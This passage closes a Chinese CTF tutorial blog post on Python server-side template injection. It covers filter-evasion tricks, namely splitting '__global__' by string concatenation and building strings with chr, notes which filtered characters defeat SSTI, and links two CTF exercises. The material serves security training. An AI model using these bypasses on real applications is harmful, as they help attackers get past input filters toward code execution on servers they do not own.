+<h3 id="字符串合并"><a href="#字符串合并" class="headerlink" title="字符串合并"></a>字符串合并</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__glo&quot;+&quot;bal__&quot; == &quot;__global__&quot;</span><br></pre></td></tr></table></figure>
+
+<p>鉴于SSTI类似于eval的特性，可以使用字符串相加绕过对一整个字符串的检测</p>
+<h3 id="chr绕过"><a href="#chr绕过" class="headerlink" title="chr绕过"></a>chr绕过</h3><p>可以用找os类相同的办法找chr类，再用chr类构造字符串</p>
+<p><strong>接下来说SSTI漏洞比较害怕什么过滤</strong></p>
+<ul>
+<li>单个大括号字符<code>{</code>, <code>}</code>，有就死（（</li>
+<li>单个小括号字符<code>(</code>,<code>)</code>，有的话只能看config或者环境变量了</li>
+</ul>
+<h2 id="0x05-例题"><a href="#0x05-例题" class="headerlink" title="0x05 例题"></a>0x05 例题</h2><p>例题：</p>
+<p>【XYCTF 2024】<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18147817#1.5">我是一个复读机</a><br>【R3CTF 2024】<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18243707">jinjaclub</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E2%80%93-python-SSTI"><span class="toc-number">1.</span> <span class="toc-text">python模板注入 – python SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E4%B8%87%E8%83%BD%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1.使用万能的对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2.直接使用代码中定义的对象</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 常见防护及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#request-args%E9%80%83%E9%80%B8"><span class="toc-number">1.4.1.</span> <span class="toc-text">request.args逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF"><span class="toc-number">1.4.2.</span> <span class="toc-text">{%%} 代替 {{}}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem%E4%BB%A3%E6%9B%BF"><span class="toc-number">1.4.3.</span> <span class="toc-text">.getitem代替[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">[]代替.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%90%88%E5%B9%B6"><span class="toc-number">1.4.5.</span> <span class="toc-text">字符串合并</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chr%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.6.</span> <span class="toc-text">chr绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%BE%8B%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 例题</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&text=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&is_video=false&description=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF web漏洞合集 Python篇（1）python中的SSTI&body=Check out this article: https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&name=CTF web漏洞合集 Python篇（1）python中的SSTI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&t=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
